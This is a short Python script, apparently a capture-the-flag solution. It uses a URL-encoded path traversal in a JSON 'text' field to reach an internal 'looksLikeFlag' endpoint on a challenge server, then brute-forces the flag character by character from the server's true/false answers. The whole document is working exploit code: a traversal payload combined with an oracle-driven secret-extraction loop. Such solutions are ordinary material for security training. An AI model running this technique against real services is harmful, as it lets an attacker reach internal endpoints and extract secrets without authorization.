import requests
import string

url = 'http://splitline.tw:5000/public_api'
prefix = "%2e%2e/looksLikeFlag?flag=FLAG{"
payload = {'text': prefix}
charset = string.ascii_lowercase + string.digits + '_}'
ans_str = ""
end = False

while 1:
    for c in charset:
        payload['text'] = prefix + ans_str + c
        
        x = requests.post(url, json=payload)
        res = x.text[len("{\"looksLikeFlag\":"):-1]
        if res == 'true':
            # find answer
            ans_str += c
            print("FLAG{" + ans_str)
            if c == '}':
                end = True
            break
    if end:
        ans_str = "FLAG{" + ans_str
        print(f"Find Flag! {ans_str}")
        break
